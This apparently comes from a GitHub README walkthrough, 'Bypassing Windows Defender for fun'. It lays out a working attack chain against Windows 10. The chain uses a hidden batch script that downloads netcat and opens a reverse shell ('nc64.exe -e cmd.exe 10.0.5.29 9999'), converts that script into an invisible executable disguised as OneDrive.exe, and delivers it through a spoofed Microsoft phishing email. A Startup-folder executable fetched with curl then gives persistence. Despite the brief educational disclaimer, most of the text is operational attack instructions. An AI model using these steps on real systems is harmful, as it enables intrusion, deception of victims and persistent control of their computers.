# Bypassing-Windows-Defender-for-fun
![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/26c6e32c-51d0-45a0-b9e2-d0c523e9be7d)


# Disclaimer:

This presentation is intended solely for educational purposes to increase awareness about phishing attacks and cybersecurity threats. The techniques demonstrated are to help you recognize and defend against potential threats. By attending this presentation, you acknowledge that any misuse or illegal use of this information is strictly prohibited and is not endorsed. The presenter bears no responsibility for any such misuse.

# Credits:
-Senouy

# Introduction:
In this demo I am taking advantage of simple things, casual softwares intended for ethical use cases and I shape them to be dangerous assets to hack our way in a Windows machine protected by MS Defender.

Let’s take a look at the script we are using.

`@echo off
call getCmdPid
call windowMode -pid %errorlevel% -mode hidden & curl https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe -o C:\Users\Public\Downloads\nc64.exe & C:\Users\Public\Downloads\nc64.exe -e cmd.exe 10.0.5.29 9999`

What the script does :

`@echo off` is a standard directive in batch files (.bat) in Windows, and it serves a similar purpose to #!/bin/bash in Linux shell scripts. Its job is to not show the commands that are being ran.

`getCmdPid.exe` is responsible for printing the PID number of the windows process we are using.

`call windowMode -pid %errorlevel% -mode hidden` now we pass the pid number of the cmd prompt we are currently on to the windowmode.exe and hiding any potential errors.

`the rest of the script` downloads netcat (a remote control tool) and outputs it to a set folder, in this case C:\Users\Public\Downloads and then runs it with the parameter –e to connect to our listening machine 10.0.5.29 through the port 9999.

![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/1ede01d4-2180-4295-92b0-473789660405)


We then use bat-to-exe-converter to convert/build our batch file to an exetuable file.

#things to change:

-import an icon to be set as the final exe’s icon.

-change exe format to 64-bit | Windows (invisible) ///This makes the exe run without triggereing the cmd.exe prompt to show.

Note: You can check the Request admin privileges box to make the final exe request admin privs to run.

The result : `OneDrive.exe`

![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/5f785b6a-785e-4365-834e-7f4722d14429)


![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/59ad8cc1-e804-423f-afec-6e6c09d5debe)


I’ve crafted a fake email using some sentences that official Microsoft teams use in their texts and used a fake Microsoft account to make it look more authentic. You can find the email here https://pastebin.com/XFrn4Z4w

Now, onto a Windows machine, the first test subject is Windows 10 version 2004. This version of Windows 10 was released back on May 27, 2020, so it's not that old.

![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/1171f4ff-bb0a-4cc3-a476-31dd97e7d534)


We now start our listner on the 9999 port and proceed to run the OneDrive.xe on the Windows machine.

`$nc –lnvp 9999`

![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/67ee4068-61d4-4511-a6af-4752f7d954ca)


After the victim has ran our malicious file, we get a reverse shell. Meaning we can control his computer and all sorts of thing including removing/creating folders and files acccessing every path we want. But there are some limitations. As you can see we are logged in as the user so that means we only have the user privileges and we need to gain Administrator rights in order to have all the rights and permissions available on the system.

![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/af552987-7c9d-404e-854c-125b8b269d13)


# Privilege Escalation and Persistence :

On this phase I’ve prepared a script that will help us gain a reverse shell with admin privileges and in any case we lose access to the machine or our shell breaks. No worries we’ll get another one once the victim machine has restarted.
The script is as follows :

`@echo off
C:\Users\Public\Downloads\nc64.exe -e cmd.exe 10.0.5.29 9999`

-I used the bat-to-exe-converter to convert/build this batch script to an exetuable file and named it `startup.exe`.

The first step is to transfer our exe to the victim machine. So to do that I started a simple http server where my startup.exe is located. To do that use the following command:

`$python3 –m http.server 80`

On the victim machine change directory to `C:\Users\Public\Downloads\` . Then download the script and move it to the `startup applications folder` using these commands :

`$curl –o startup.exe http://10.0.5.29/startup3.exe`

`$copy "C:\Users\Public\Downloads\startup.exe" "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\"`

![image](https://github.com/S3nouy/Bypassing-Windows-Defender-for-fun/assets/77050462/8e482e24-8b37-4377-9b3c-693d6ed33a3b)


Finally you can send a command to reboot the machine ‘’shutdown –r –t 0’’ or wait for the victim user to reboot it and you’ll get a shell again but this time you’ll have admin rights.

TIP: Don’t forget to start your listener again.

# Conclusion :

This attack has succeeded in both Windows 10 version 2004 and the latest Windows 10 2023 at the time of doing this experiment.

I hope you all enjoyed this walkthrough and had fun discovering what casual tools we use and some scripting knowledge can do.


